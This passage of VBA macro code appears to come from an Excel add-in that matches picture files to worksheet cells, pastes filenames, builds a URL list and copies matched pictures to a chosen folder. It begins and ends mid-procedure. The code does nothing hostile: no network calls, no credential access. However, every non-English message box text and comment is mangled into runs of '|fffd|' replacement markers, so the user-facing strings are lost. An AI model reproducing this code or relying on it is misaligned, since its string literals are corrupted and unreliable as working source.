            If cell2 Is Nothing Then
                Set cell2 = ra.Cells(UBound(arr), 1)
                If cell2.row > cell1.row Then
                    With all_filenames.Worksheet.Range(cell1, cell2)
                        .Merge: DoEvents
                        Intersect(.EntireRow, all_filenames.Worksheet.Columns(PICTURE_COLUMN(cell1))).Merge
                        .VerticalAlignment = xlVAlignCenter
                    End With
                End If
            End If
        End If
        Set cell1 = Nothing: Set cell2 = Nothing
    Next
    pi.Log tt("PI_MergeRowsDone") & vbNewLine & vbNewLine
    pi.Line2 = tt("PI_MergeRowsDone"): pi.Line3 = ""

    Application.DisplayAlerts = True
End Sub

Sub PasteFilenames(ByVal param As Long)
    On Error Resume Next: Err.Clear
    If ActiveWorkbook Is Nothing Then MsgBox tt("MSG_OpenWorkbookFirst"), vbCritical, tt("MSG_OpenWorkbookFirst_Title"): Exit Sub

    If SETT.GetBoolean("CheckBox_UseCurrentFolder") Then
        If ActiveWorkbook.Path = "" Then
            MsgBox tt("MSG_UseCurrentFolder_Error_UnsavedWB", tt("CONST_Pic_FOLDER"), ActiveWorkbook.name), vbCritical, tt("FolderNotFound")
            ShowSettingsPage
            Exit Sub
        End If
    End If

    StopMacro = False
    If Dir(PICTURES_FOLDER$, vbDirectory) = "" Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
               PICTURES_FOLDER$, vbCritical, "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If


    Dim coll As Collection
    Set coll = FilenamesCollection(PICTURES_FOLDER$, "*")

    If coll.Count = 0 Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & PICTURES_FOLDER$
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ' Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If


    Dim n_err As Long, n_ok As Long

    Dim cell As Range, ra As Range, PicCell As Range

    FirstCellAddress$ = SETT.GetText("TextBox_FirstCell")
    If FirstCellAddress$ = "" Then FirstCellAddress$ = DEFAULT_FIRST_CELL$

    Dim FirstCell As Range: Set FirstCell = Range(FirstCellAddress$)        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Set ra = Range(FirstCell, FirstCell.EntireColumn.Cells(Rows.Count))

    If IsNull(ra.text) Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColumnNameByColumnNumber(FirstCell.Column) & _
               " (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & FirstCell.Address(0, 0) & " |fffd| |fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ra.Address(0, 0) & " |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
               "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        If MsgBox(msg, vbExclamation + vbYesNo + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbNo Then Exit Sub
    End If

    Err.Clear
    Set ra = FirstCell.Resize(coll.Count)
    ReDim arr(1 To coll.Count, 1 To 1)
    For i = LBound(arr) To UBound(arr)
        arr(i, 1) = coll(i)
    Next i

    Select Case param
        Case 1:    'filenames only

            For i = LBound(arr) To UBound(arr)
                arr(i, 1) = Split(arr(i, 1), "\")(UBound(Split(arr(i, 1), "\")))
                If arr(i, 1) Like "*.*" Then arr(i, 1) = Left(arr(i, 1), InStrRev(arr(i, 1), ".") - 1)
            Next i

        Case 2:    'filenames with extensions

            For i = LBound(arr) To UBound(arr)
                arr(i, 1) = Split(arr(i, 1), "\")(UBound(Split(arr(i, 1), "\")))
            Next i

        Case 3:    ' full names
    End Select

    ra.Value = arr
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & coll.Count & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & PICTURES_FOLDER$, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd|"

    'ND "run macro", "Insert filenames, files=" & coll.Count & ", mode=" & param
End Sub


Sub PasteFilenamesEx()
    ' On Error Resume Next: Err.Clear

    If SETT.GetBoolean("CheckBox_UseCurrentFolder") Then
        If ActiveWorkbook.Path = "" Then
            MsgBox tt("MSG_UseCurrentFolder_Error_UnsavedWB", tt("CONST_Pic_FOLDER"), ActiveWorkbook.name), vbCritical, tt("FolderNotFound")
            ShowSettingsPage
            Exit Sub
        End If
    End If

    StopMacro = False
    If Dir(PICTURES_FOLDER$, vbDirectory) = "" Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
               PICTURES_FOLDER$, vbCritical, "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If


    Dim coll As Collection
    Set coll = FilenamesCollection(PICTURES_FOLDER$, "*")

    If coll.Count = 0 Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & PICTURES_FOLDER$
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ' Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If

    Dim dic As New Dictionary, filename$, Key$, v, ind&, prefix$
    prefix$ = SETT.GetText("TextBox_PasteFilenamesEx_URLprefix")
    dic.CompareMode = TextCompare

    For Each Item In coll
        filename$ = Dir(Item)
        Key$ = Split(Split(filename$, ".")(0), "_")(0)
        dic.Item(Key$) = dic.Item(Key$) & IIf(dic.Item(Key$) = "", "", " ") & prefix$ & filename$
    Next

    Application.Workbooks.Add xlWBATWorksheet

    ReDim arr(1 To dic.Count + 1, 1 To 2)
    arr(1, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(1, 2) = "|fffd||fffd||fffd||fffd|"
    ind& = 1

    For Each v In dic.Keys
        ind& = ind& + 1
        arr(ind&, 1) = v
        arr(ind&, 2) = dic(v)
    Next

    With Range("a1").Resize(dic.Count + 1, 2)
        .Value = arr
        .ColumnWidth = 20
    End With
    Set dic = Nothing
End Sub

Sub CopyPicturesIntoFolder()
    On Error Resume Next
    If ActiveWorkbook Is Nothing Then MsgBox tt("MSG_OpenWorkbookFirst"), vbCritical, tt("MSG_OpenWorkbookFirst_Title"): Exit Sub

    If SETT.GetBoolean("CheckBox_UseCurrentFolder") Then
        If ActiveWorkbook.Path = "" Then
            MsgBox tt("MSG_UseCurrentFolder_Error_UnsavedWB", tt("CONST_Pic_FOLDER"), ActiveWorkbook.name), vbCritical, tt("FolderNotFound")
            ShowSettingsPage
            Exit Sub
        End If
    End If

    StopMacro = False
    If Dir(PICTURES_FOLDER$, vbDirectory) = "" Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
               PICTURES_FOLDER$, vbCritical, "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If


    Dim coll As Collection
    Set coll = FilenamesCollection(PICTURES_FOLDER$, "*")

    If coll.Count = 0 Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & PICTURES_FOLDER$
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ' Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If


    Dim n_err As Long, n_ok As Long

    Dim cell As Range, ra As Range, PicCell As Range

    FirstCellAddress$ = SETT.GetText("TextBox_FirstCell")
    If FirstCellAddress$ = "" Then FirstCellAddress$ = DEFAULT_FIRST_CELL$

    Dim FirstCell As Range: Set FirstCell = Range(FirstCellAddress$)        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Set ra = Range(FirstCell, FirstCell.EntireColumn.Cells(Rows.Count).End(xlUp))
    If ra.row < FirstCell.row Or (ra.Rows.Count = 1 And Trim(ra.Cells(1)) = "") Then
        msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & FirstCellAddress$ & "|fffd|, |fffd| |fffd||fffd||fffd||fffd|." & vbNewLine & _
              "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbExclamation, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If

    pfolder$ = PICTURES_FOLDER$
    def_BaseDestFolder$ = CreateObject("Scripting.FileSystemObject").GetFolder(pfolder$).ParentFolder.Path
    BaseDestFolder$ = SETT.GetText("FolderForCopiesOfPictures", def_BaseDestFolder$)
    DestFolder$ = FWF.GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", BaseDestFolder$)
    If DestFolder$ = "" Then
        msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If
    SETT.SetText "FolderForCopiesOfPictures", DestFolder$

    RowsCount& = ra.Cells.Count

    Dim pi As New ProgressIndicator, res_coll As Collection        ', PicProp As PictureProperties
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , 3: pi.FP.SpinButton_log.Visible = False
    pi.StartNewAction , , , , "$time", ra.Cells.Count


    For Each cell In ra.Cells        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        If Len(Trim(cell)) Then

            Set res_coll = GetPictureFilenames_ForCell(cell, coll)
            If SETT.GetBoolean("CheckBox_Add_ImagesCount") Then
                col& = Fix(Val(SETT.GetNumber("ComboBox_ImagesCountColumn")))
                If col& Then cell.EntireRow.Cells(col&) = res_coll.Count
            End If

            pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:  " & res_coll.Count

            n& = 0: nok_current& = 0
            For Each file In res_coll
                n = n + 1
                pi.Line3 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & n & " |fffd||fffd| " & res_coll.Count & ": " & Dir(file, vbNormal)
                Err.Clear: FileCopy file, DestFolder$ & Dir(file, vbNormal)
                If Err Then n_err = n_err + 1 Else n_ok = n_ok + 1: nok_current& = nok_current& + 1
            Next

            logtext$ = "|fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0, xlA1) & ", |fffd||fffd||fffd||fffd||fffd| |fffd|" & cell & "|fffd|" & vbNewLine

            If res_coll.Count > 0 Then
                logtext$ = logtext$ & "+  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & res_coll.Count & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nok_current&
            Else
                logtext$ = logtext$ & "-  |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End If
            pi.Log logtext$ & vbNewLine
        End If
        DoEvents
        If StopMacro Then Exit For
    Next cell

    pi.Log vbNewLine & vbNewLine
    pi.StartNewAction 100, 100, IIf(StopMacro, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."), _
                      "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_ok & " |fffd||fffd| " & n_ok + n_err & vbNewLine, " "

    msg = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|:  " & vbNewLine & PICTURES_FOLDER$ & vbNewLine & vbNewLine
    msg = msg & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & SEARCH_MODE_TXT & vbNewLine & vbNewLine

    msg = msg & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & RowsCount& & " |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ra.Address(0, 0) & "" & vbNewLine & vbNewLine
    msg = msg & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_ok & vbNewLine
    msg = msg & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_err

    pi.CancelButton.Visible = False
    pi.Log msg
    StopMacro = True
    If SETT.GetBoolean("CheckBox_CloseProgressBar") Then pi.Hide

    'ND "run macro", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & IIf(StopMacro, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") & _
     ", cells=" & RowsCount& & " (addr=" & ra.Address(0, 0) & "), files=" & n_ok & ", errors=" & n_err

    Application.ScreenUpdating = True
    FWF.OpenFolder DestFolder$
End Sub

Function GetPictureFilenames_ForCell(ByVal cell As Range, ByRef files As Collection) As Collection
    On Error Resume Next
    Set GetPictureFilenames_ForCell = New Collection
    CellText$ = Trim(cell)
    If CellText$ = "" Then Exit Function

    If CellText$ Like "[A-z]:\?*.?*" Or CellText$ Like "\\?*\?*.?*" Then
        GetPictureFilenames_ForCell.Add CellText$
        Exit Function
    Else
        SMode = SEARCH_MODE
        For Each file In files
            filename$ = Split(file, "\")(UBound(Split(file, "\")))
            FilenameNoExt$ = filename$
            If filename$ Like "*.*" Then FilenameNoExt$ = Left(filename$, InStrRev(filename$, ".") - 1)

            Select Case SMode
                Case SM_CellTextInFilename
                    If filename$ Like "*" & CellText$ & "*" Then GetPictureFilenames_ForCell.Add file
                Case SM_FilenameInCellText
                    If CellText$ Like "*" & FilenameNoExt$ & "*" Then GetPictureFilenames_ForCell.Add file
                Case SM_Equal
                    If CellText$ = FilenameNoExt$ Or CellText$ = filename$ Then GetPictureFilenames_ForCell.Add file
            End Select
        Next
    End If
End Function




Sub PasteFilenamesFromSubfolder()
    On Error Resume Next
    If ActiveWorkbook Is Nothing Then MsgBox tt("MSG_OpenWorkbookFirst"), vbCritical, tt("MSG_OpenWorkbookFirst_Title"): Exit Sub

    If SETT.GetBoolean("CheckBox_UseCurrentFolder") Then
        If ActiveWorkbook.Path = "" Then
            MsgBox tt("MSG_UseCurrentFolder_Error_UnsavedWB", tt("CONST_Pic_FOLDER"), ActiveWorkbook.name), vbCritical, tt("FolderNotFound")
            ShowSettingsPage
            Exit Sub
        End If
    End If

    StopMacro = False
    If Dir(PICTURES_FOLDER$, vbDirectory) = "" Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
               PICTURES_FOLDER$, vbCritical, "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If


    Dim coll As Collection
    Set coll = SubFoldersCollection(PICTURES_FOLDER$, "*")

    If coll.Count = 0 Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
